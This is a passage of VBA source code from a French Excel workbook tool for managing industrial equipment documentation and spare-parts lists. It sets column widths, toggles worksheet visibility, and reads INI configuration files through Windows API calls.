                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 14 Then
                    .Columns(iColonne).ColumnWidth = 15
                ElseIf .Cells(1, iColonne).Value = 15 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 16 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 17 Then
                    .Columns(iColonne).ColumnWidth = 18
                ElseIf .Cells(1, iColonne).Value = 18 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 19 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 20 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 21 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 22 Then
                    .Columns(iColonne).ColumnWidth = 6
                ElseIf .Cells(1, iColonne).Value = 23 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 24 Then
                    .Columns(iColonne).ColumnWidth = 30
                ElseIf .Cells(1, iColonne).Value = 25 Then
                    .Columns(iColonne).ColumnWidth = 8
                ElseIf .Cells(1, iColonne).Value = 26 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 27 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 28 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 29 Then
                    .Columns(iColonne).ColumnWidth = 30
                ElseIf .Cells(1, iColonne).Value = 30 Then
                    .Columns(iColonne).ColumnWidth = 30
                ElseIf .Cells(1, iColonne).Value = 33 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 32 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 34 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 37 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 31 Then
                    .Columns(iColonne).ColumnWidth = 20
                ElseIf .Cells(1, iColonne).Value = 35 Then
                    .Columns(iColonne).ColumnWidth = 20
                ElseIf .Cells(1, iColonne).Value = 36 Then
                    .Columns(iColonne).ColumnWidth = 6
                ElseIf .Cells(1, iColonne).Value = 38 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 39 Then
                    .Columns(iColonne).ColumnWidth = 12
                ElseIf .Cells(1, iColonne).Value = 40 Then
                    .Columns(iColonne).ColumnWidth = 50
                ElseIf .Cells(1, iColonne).Value = 41 Then
                    .Columns(iColonne).ColumnWidth = 15
                ElseIf .Cells(1, iColonne).Value = 42 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 43 Then
                    .Columns(iColonne).ColumnWidth = 24
                ElseIf .Cells(1, iColonne).Value = 44 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 45 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 46 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 47 Then
                    .Columns(iColonne).ColumnWidth = 50
                End If
            End If
            iColonne = iColonne + 1
        Loop Until iColonne > 48
        .Rows.AutoFit
        .Cells.EntireColumn.AutoFit
        If sh = shDecoupage Then .Rows("2:2").RowHeight = 195
    End With
End Sub

Sub Largeur_Colonnes_Mat_doc(sh As String)
    Dim iColonne As Integer
    With ThisWorkbook.Worksheets(sh)
        ' On balaie toutes les colonnes
        iColonne = 1
        Do
            If Not (.Cells(1, iColonne).EntireColumn.Hidden) Then
                If .Cells(1, iColonne).Value = 0 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 12 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 13 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 14 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 15 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 16 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 18 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 19 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 22 Then
                    .Columns(iColonne).ColumnWidth = 6
                ElseIf .Cells(1, iColonne).Value = 21 Then
                    .Columns(iColonne).ColumnWidth = 20
                ElseIf .Cells(1, iColonne).Value = 23 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 24 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 29 Then
                    .Columns(iColonne).ColumnWidth = 15
                ElseIf .Cells(1, iColonne).Value = 30 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 31 Then
                    .Columns(iColonne).ColumnWidth = 20
                ElseIf .Cells(1, iColonne).Value = 32 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 33 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 40 Then
                    .Columns(iColonne).ColumnWidth = 50
                ElseIf .Cells(1, iColonne).Value = 41 Then
                    .Columns(iColonne).ColumnWidth = 15
                ElseIf .Cells(1, iColonne).Value = 42 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 43 Then
                    .Columns(iColonne).ColumnWidth = 25
                ElseIf .Cells(1, iColonne).Value = 44 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 45 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 46 Then
                    .Columns(iColonne).ColumnWidth = 15
                ElseIf .Cells(1, iColonne).Value = 47 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 48 Then
                    .Columns(iColonne).ColumnWidth = 4
                ElseIf .Cells(1, iColonne).Value = 49 Then
                    .Columns(iColonne).ColumnWidth = 80
                End If
            End If
            iColonne = iColonne + 1
        Loop Until iColonne > 27
        .Rows.AutoFit
        .Cells.EntireColumn.AutoFit
    End With
End Sub

Sub Largeur_Colonnes_ListePR(sh As String)
    Dim iColonne As Integer
    With ThisWorkbook.Worksheets(sh)
        ' On balaie toutes les colonnes
        iColonne = 1
        Do
            If Not (.Cells(1, iColonne).EntireColumn.Hidden) Then
                If .Cells(1, iColonne).Value = 0 Then
                ElseIf .Cells(1, iColonne).Value = 12 Then
                    .Columns(iColonne).ColumnWidth = 8
                ElseIf .Cells(1, iColonne).Value = 13 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 18 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 19 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 21 Then
                    .Columns(iColonne).ColumnWidth = 25
                ElseIf .Cells(1, iColonne).Value = 23 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 24 Then
                    .Columns(iColonne).ColumnWidth = 100
                ElseIf .Cells(1, iColonne).Value = 29 Then
                    .Columns(iColonne).ColumnWidth = 50
                ElseIf .Cells(1, iColonne).Value = 30 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 31 Then
                    .Columns(iColonne).ColumnWidth = 20
                ElseIf .Cells(1, iColonne).Value = 32 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 33 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 40 Then
                    .Columns(iColonne).ColumnWidth = 50
                ElseIf .Cells(1, iColonne).Value = 42 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 43 Then
                    .Columns(iColonne).ColumnWidth = 25
                ElseIf .Cells(1, iColonne).Value = 44 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 47 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 45 Then
                    .Columns(iColonne).ColumnWidth = 25
                ElseIf .Cells(1, iColonne).Value = 48 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 49 Then
                    .Columns(iColonne).ColumnWidth = 40
                ElseIf .Cells(1, iColonne).Value = 50 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 51 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 52 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 53 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 54 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 55 Then
                    .Columns(iColonne).ColumnWidth = 5
                ElseIf .Cells(1, iColonne).Value = 56 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 57 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 58 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 59 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 60 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 61 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 65 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 66 Then
                    .Columns(iColonne).ColumnWidth = 28
                ElseIf .Cells(1, iColonne).Value = 74 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 78 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 84 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 85 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 88 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 93 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 94 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 105 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 109 Then
                    .Columns(iColonne).ColumnWidth = 2
                ElseIf .Cells(1, iColonne).Value = 126 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 129 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 130 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 131 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 132 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 133 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 134 Then
                    .Columns(iColonne).ColumnWidth = 10
                ElseIf .Cells(1, iColonne).Value = 157 Then
                    .Columns(iColonne).ColumnWidth = 3
                ElseIf .Cells(1, iColonne).Value = 158 Then
                    .Columns(iColonne).ColumnWidth = 3
                End If
            End If
            iColonne = iColonne + 1
        Loop Until iColonne > 128
        .Rows.AutoFit
        .Cells.EntireColumn.AutoFit
    End With
End Sub
Attribute VB_Name = "I_Affichage"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Affichages du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 15/07/2008
'[Version       : V1.0 du 21/07/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Affichages du TDI
'[---------------------------------------------------------------------------

Function Vue_Rapprochement_Sacim(WsMat As Worksheet, Masque As Boolean)
    Dim Col         As Variant
    Dim LstCol      As Variant
    
    LstCol = Array("MatNature", "MatRefFournisseur", "MatSuffixeReference", "MatNomFournisseur", "MatDesignation", _
            "MatRefIntegrateur", "MatNomIntegrateur", "MatMabecPreDocumente", "MatPieceRechange", "MatEtatSacim", _
            "MatMabecSacim", "MatCodePreco", "MatNumeroPlan", "MatSuffixePlan", "MatNomFourSacim", "MatRefFourSacim", _
            "MatDesignSacim")
            
    With WsMat
        If Masque Then
            .Columns("A:AI").Hidden = True
            For Each Col In LstCol
                .Columns(.Range(Col).Column).Hidden = False
            Next
        Else
            .Columns.Hidden = False 'Affiche Tout
        End If
    End With

End Function


Function Affichage_Onglet_Par_Defaut()
    Dim i, Pos As Integer
    Dim Liste, Valeur As Variant
    Dim trouve As Boolean
    
    Liste = Array(shWelcome, ShAffaire, shDecoupage, shMateriels, shDocuments, shPieces_Rechange, shTable_Fonction_Process)
    On Error Resume Next ' Erreur si l'onglet est d|fffd|j|fffd| masqu|fffd|
    ' Pour tous les onglets |fffd| masquer, on passe la propri|fffd|t|fffd| |fffd| false
    i = 1
    Do
        trouve = False
        For Each Valeur In Liste
            Pos = VBA.InStr(ThisWorkbook.Sheets(i).Name, Valeur)
            If Pos > 0 Then trouve = True:                                 Exit For
        Next
        If trouve Then ThisWorkbook.Sheets(i).Visible = True Else ThisWorkbook.Sheets(i).Visible = False
        i = i + 1
    Loop Until i > ThisWorkbook.Sheets.Count
    ThisWorkbook.Sheets(shWelcome).Select
    On Error GoTo 0
End Function


Function Affichage_Tous_Onglets()
    Dim sh As Object
    For Each sh In ThisWorkbook.Worksheets
        sh.Visible = True
    Next


'    ' Feuille Nomenclature
'    Sheets(shCde_Nomenclature).Visible = True
'    Sheets(shAffaire).Visible = True
'    Sheets(shTable_Fonction_Process).Visible = True
'    Sheets(shEquipmt).Visible = True
'    Sheets(shSsEnsemble).Visible = True
'    Sheets(shArticles).Visible = True
'
'    ' Feuille Decoupage
'    Sheets(shCde_Simon).Visible = True
'    Sheets(shDecoupage).Visible = True
'    Sheets(shMateriels).Visible = True
'    Sheets(shBibli_Fr).Visible = True
'    Sheets(shBibli_Tra).Visible = True
'    Sheets(shPt).Visible = True
'    Sheets(shGE_ACreer).Visible = True
'    Sheets(shGE_AModifier).Visible = True
'    Sheets(shENS_ACreer).Visible = True
'    Sheets(shENS_AModifier).Visible = True
'    Sheets(shENS_ASupprimer).Visible = True
'
'    ' Feuile Documents
'    Sheets(shCde_Document).Visible = True
'    Sheets(shLien_FID).Visible = True
'    Sheets(shCreation_FID).Visible = True
'    Sheets(shCSV).Visible = True
'    Sheets(shCtrl_ged).Visible = True
'
'    ' Liste PR
'    Sheets(shPieces_Rechange).Visible = True
'    Sheets(shDico).Visible = True
'    Sheets(shTraduction).Visible = True
'    Sheets(shDecoupage).Select
End Function


Function Bouton_Affiche_Decoupage()
    Application.ScreenUpdating = False
    ThisWorkbook.Activate
    ' Feuille Nomenclature
    Sheets(shWelcome).Visible = True
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = True
    Sheets(shTable_Fonction_Process).Visible = True
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False

    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = False
    Sheets(shDecoupage).Visible = True
    Sheets(shMateriels).Visible = True
    Sheets(shDocuments).Visible = True
    Sheets(shPt).Visible = False
    Sheets(shGE_ACreer).Visible = False
    Sheets(shGE_AModifier).Visible = False
    Sheets(shENS_ACreer).Visible = False
    Sheets(shENS_AModifier).Visible = False
    Sheets(shENS_ASupprimer).Visible = False
  
    ' Feuile Documents
    Sheets(shCde_Document).Visible = False
    Sheets(shListeDeFID).Visible = False
    Sheets(shListe_FID).Visible = False
    Sheets(shListe_Originaux).Visible = False
    Sheets(shListe_Liens).Visible = False
    Sheets(shCSV).Visible = False
    Sheets(shCtrl_Ged).Visible = False
    ' liste PR
    Sheets(shPieces_Rechange).Visible = True
    Sheets(shDico).Visible = False
    Sheets(shDecoupage).Select
    Application.ScreenUpdating = True
End Function


Function Bouton_Affiche_Document()
    Application.ScreenUpdating = False
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = True
    Sheets(shTable_Fonction_Process).Visible = True
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False

    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = False
    Sheets(shDecoupage).Visible = True
    Sheets(shMateriels).Visible = True
    Sheets(shPt).Visible = False
    Sheets(shGE_ACreer).Visible = False
    Sheets(shGE_AModifier).Visible = False
    Sheets(shENS_ACreer).Visible = False
    Sheets(shENS_AModifier).Visible = False
    Sheets(shENS_ASupprimer).Visible = False
    
    ' Feuile Documents
    Sheets(shCde_Document).Visible = True
'    Sheets(shLien_FID).Visible = True
'    Sheets(shCreation_FID).Visible = True
    Sheets(shCSV).Visible = True
    Sheets(shCtrl_Ged).Visible = True
    Sheets(shCde_Document).Select
'    Sheets("FID").Visible = True
    ' liste PR
    Sheets(shPieces_Rechange).Visible = True
    Sheets(shDico).Visible = False
    Application.ScreenUpdating = True
    
End Function



Private Sub Bouton_Affiche_Nomenclature()
    Application.ScreenUpdating = False
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = True
    Sheets(ShAffaire).Visible = True
    Sheets(shEquipmt).Visible = True
    Sheets(shSsEnsemble).Visible = True
    Sheets(shArticles).Visible = True
    'Sheets("FID").Visible = True

    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = False
    Sheets(shDecoupage).Visible = True
    Sheets(shTable_Fonction_Process).Visible = True
    Sheets(shMateriels).Visible = True
    Sheets(shPt).Visible = False
    Sheets(shGE_ACreer).Visible = False
    Sheets(shGE_AModifier).Visible = False
    Sheets(shENS_ACreer).Visible = False
    Sheets(shENS_AModifier).Visible = False
    Sheets(shENS_ASupprimer).Visible = False
   
    ' Feuile Documents
    Sheets(shCde_Document).Visible = False
'    Sheets(shLien_FID).Visible = False
'    Sheets(shCreation_FID).Visible = False
    Sheets(shCSV).Visible = False
    Sheets(shCtrl_Ged).Visible = False
    Sheets(shCde_Nomenclature).Select
    Application.ScreenUpdating = True
    
    ' liste PR
    Sheets(shPieces_Rechange).Visible = True
    Sheets(shDico).Visible = False
    
End Sub

Function Affiche_Simon_Renom()
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = True
    Sheets(shTable_Fonction_Process).Visible = True
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False

    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = True
    Sheets(shDecoupage).Visible = True
    Sheets(shMateriels).Visible = False
    Sheets(shPt).Visible = True
    Sheets(shGE_ACreer).Visible = True
    Sheets(shGE_AModifier).Visible = True
    Sheets(shENS_ACreer).Visible = True
    Sheets(shENS_AModifier).Visible = True
    Sheets(shENS_ASupprimer).Visible = False
    
   
    ' Feuile Documents
    Sheets(shCde_Document).Visible = False
'    Sheets(shLien_FID).Visible = False
'    Sheets(shCreation_FID).Visible = False
    Sheets(shCSV).Visible = False
    Sheets(shCtrl_Ged).Visible = False
    Sheets(shCde_Simon).Select
    ' liste PR
    Sheets(shPieces_Rechange).Visible = False
    Sheets(shDico).Visible = False
End Function


Function Affiche_Simon_MCA()
    Application.ScreenUpdating = False
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = True
    Sheets(shTable_Fonction_Process).Visible = True
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False
    Sheets(shPieces_Rechange).Visible = False

    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = True
    Sheets(shDecoupage).Visible = True
    Sheets(shMateriels).Visible = True
    Sheets(shPt).Visible = True
    Sheets(shGE_ACreer).Visible = True
    Sheets(shGE_AModifier).Visible = True
    Sheets(shENS_ACreer).Visible = True
    Sheets(shENS_AModifier).Visible = True
    Sheets(shENS_ASupprimer).Visible = False
    
    ' Feuile Documents
    Sheets(shCde_Document).Visible = False
'    Sheets(shLien_FID).Visible = False
'    Sheets(shCreation_FID).Visible = False
    Sheets(shCSV).Visible = False
    Sheets(shCtrl_Ged).Visible = False
    Sheets(shCde_Simon).Select
    Application.ScreenUpdating = True
End Function

Function Affiche_Simon_Doc()
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = False
    Sheets(shTable_Fonction_Process).Visible = False
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False
    'Sheets("FID").Visible = False
   
    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = False
    Sheets(shDecoupage).Visible = False
    Sheets(shMateriels).Visible = False
    Sheets(shPt).Visible = False
    Sheets(shGE_ACreer).Visible = False
    Sheets(shGE_AModifier).Visible = False
    Sheets(shENS_ACreer).Visible = False
    Sheets(shENS_AModifier).Visible = False
    Sheets(shENS_ASupprimer).Visible = False
      
    ' Feuile Documents
    Sheets(shCde_Document).Visible = True
'    Sheets(shLien_FID).Visible = True
'    Sheets(shCreation_FID).Visible = True
    Sheets(shCSV).Visible = True
    Sheets(shCtrl_Ged).Visible = True
    
    ' liste PR
    Sheets(shPieces_Rechange).Visible = True
    Sheets(shDico).Visible = False
End Function


Sub Affiche_PR()
    On Error Resume Next
    ' Feuille Nomenclature
    Sheets(shCde_Nomenclature).Visible = False
    Sheets(ShAffaire).Visible = True
    Sheets(shTable_Fonction_Process).Visible = False
    Sheets(shEquipmt).Visible = False
    Sheets(shSsEnsemble).Visible = False
    Sheets(shArticles).Visible = False
    Sheets(shWelcome).Visible = False
    ' Feuille Decoupage
    Sheets(shCde_Simon).Visible = False
    Sheets(shDecoupage).Visible = False
    Sheets(shMateriels).Visible = False
    Sheets(shPt).Visible = False
    Sheets(shGE_ACreer).Visible = False
    Sheets(shGE_AModifier).Visible = False
    Sheets(shENS_ACreer).Visible = False
    Sheets(shENS_AModifier).Visible = False
    Sheets(shENS_ASupprimer).Visible = False
    
    ' Feuile Documents
    Sheets(shCde_Document).Visible = False
    Sheets(shDocuments).Visible = False
'    Sheets(shLien_FID).Visible = False
'    Sheets(shCreation_FID).Visible = False
    Sheets(shCSV).Visible = False
    Sheets(shCtrl_Ged).Visible = False
    Sheets(ShAffaire).Select
    
    ' liste PR
    Sheets(shPieces_Rechange).Visible = True
    Sheets(shDico).Visible = False
End Sub


Sub Affichage_Pieces_Rechange()
    Dim Mode As String
    With ThisWorkbook.Worksheets(ShAffaire)
        Mode = VBA.Mid(.Cells(16, 9).Value, 1, 4)
        If Mode = "L_PR" Then
            Sel_PR
        ElseIf Mode = "L_DP" Then
            Sel_DPG
        ElseIf Mode = "L_DC" Then
            Sel_DCM
        ElseIf Mode = "L_UN" Then
            Sel_Unique
        ElseIf Mode = "L_GL" Then
            Sel_Global
        ElseIf Mode = "L_To" Then
            Sel_Tout
        End If
    End With
End Sub

Public Sub GererConfiguration(ON_OFF As Boolean)
    If ON_OFF Then
        ' On restaure les configurations existantes
        Application.ScreenUpdating = boEcran
'        Application.DisplayStatusBar = boBarre
        Application.Calculation = iCalcul
        Application.EnableEvents = boEvent
        ' ActiveSheet.DisplayPageBreaks = boSaut
    Else
        ' On sauvegarde les configurations existantes
        boEcran = True
        boBarre = True
        iCalcul = Application.Calculation
        boEvent = True
        ' boSaut = ActiveSheet.DisplayPageBreaks
        ' On force les configurations
        Application.ScreenUpdating = False
'        Application.DisplayStatusBar = False
        Application.Calculation = xlCalculationManual
        Application.EnableEvents = False
        ' ActiveSheet.DisplayPageBreaks = False
    End If
End Sub

Sub ConfigurationON()
    Application.ScreenUpdating = True
    Application.DisplayStatusBar = True
    Application.Calculation = xlCalculationAutomatic
    Application.EnableEvents = True
End Sub
Attribute VB_Name = "IniClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.4 du 17/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Classe de Gestion d'acc|fffd|s aux Fichiers Ini
'[---------------------------------------------------------------------------

Option Explicit

'Fonctions API pour fichiers INI
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
'Private Declare Function GetPrivateProfileInt Lib "kernel32" Alias "GetPrivateProfileIntA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal nDefault As Long, ByVal lpFileName As String) As Long
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long


'Fonction lisant du texte depuis le fichier.ini principal (m|fffd|me nom que la macro)
Private Function ReadFileIniMain(nameSection As String, nameSubject As String, bufferReturn As String, nameFileIniMain As String) As Boolean
    Dim answer        As Long

    'Obtention du nom du fichier ini
    'nameFileIniMain = WBooksCls.WorkBookName(ThisWorkbook, False)
    nameFileIniMain = APP_SIA & ".ini"
    
    'V|fffd|rif de l'acc|fffd|s au fichier
    'Message |fffd| laisser en Dur dans le Code
    If Not FilesCls.ExistFileInDir(FilesCls.PathWorkBook(ThisWorkbook, False), nameFileIniMain) Then MsgBox msgDefRes & " : " & nameFileIniMain & VBA.Chr(13) & VBA.Chr(13) & msgReinstal, vbCritical, APP_TITLE: End
    
    'Lecture
    bufferReturn = VBA.Space$(1024)
    answer = GetPrivateProfileString(nameSection, nameSubject, " ", bufferReturn, VBA.Len(bufferReturn), FilesCls.PathWorkBook(ThisWorkbook, True) & nameFileIniMain)
    
    'Epuration
    bufferReturn = VBA.Trim(bufferReturn)
    While VBA.Asc(VBA.Right(bufferReturn, 1)) = 0 And VBA.Len(bufferReturn) > 1
        bufferReturn = VBA.Left(bufferReturn, VBA.Len(bufferReturn) - 1)
    Wend
    
    'Controle du texte renvoy|fffd|
    'Message |fffd| laisser en Dur dans le Code
    If Not ControlTextFileIni(bufferReturn) Then MsgBox msgFile & nameFileIniMain & msgDefStruct & nameSection & "/" & nameSubject, vbCritical, APP_TITLE: Exit Function
    
   'Si ok
    ReadFileIniMain = True
End Function


'Fonction lisant du texte dans un fichier.ini Main
Function ReadStringIniMain(nameSection As String, nameSubject As String, bufferReturn As String) As Boolean
    Dim nameFileIniMain     As String
    Dim nameFileIniLangage  As String
    
    If Not Fichier_Ini Then: bufferReturn = Translate(nameSection, nameSubject, True): ReadStringIniMain = True: Exit Function
    
    'Obtention du chemin et du nom du fichier ini principal
    ObtainNameFilesIni nameFileIniMain, nameFileIniLangage
    
    'Lecture
    ReadStringIniMain = ReadStringIni(nameSection, nameSubject, bufferReturn, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniMain)
End Function


'Fonction lisant du texte dans un fichier.ini Langage
Function ReadStringIniLangage(nameSection As String, nameSubject As String, Optional Gest_Erreur As Boolean = True) As String
'Function ReadStringIniLangage(nameSection As String, nameSubject As String, bufferReturn As String) As Boolean
    Dim nameFileIniMain     As String
    Dim nameFileIniLangage  As String
    Dim bufferReturn        As String
    
    If Not Fichier_Ini Then ReadStringIniLangage = Translate(nameSection, nameSubject, Gest_Erreur): Exit Function
    
    'Obtention du chemin et du nom du fichier ini principal
    ObtainNameFilesIni nameFileIniMain, nameFileIniLangage
    
    'V|fffd|rif de l'acc|fffd|s au fichier
    'Message |fffd| laisser en Dur dans le Code
    If Not FilesCls.ExistFileInDir(FilesCls.PathWorkBook(ThisWorkbook, False), nameFileIniLangage) Then MsgBox msgDefRes & " : " & nameFileIniLangage & VBA.Chr(13) & VBA.Chr(13) & msgReinstal, vbCritical, APP_TITLE: End
    
    'Lecture
    If ReadStringIni(nameSection, nameSubject, bufferReturn, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniLangage) Then ReadStringIniLangage = bufferReturn
End Function


'Obtention du nom des fichiers ini
Private Sub ObtainNameFilesIni(nameFileIniMain As String, nameFileIniLangage As String)
    'Nom fichier langage
    If Not ReadFileIniMain("Language", "NameIniLangage", nameFileIniLangage, nameFileIniMain) Then PageAccueil.ShowWelcome True
    nameFileIniLangage = APP_SIA & "_" & nameFileIniLangage & ".ini"
End Sub


'Fonction lisant du texte dans un fichier.ini
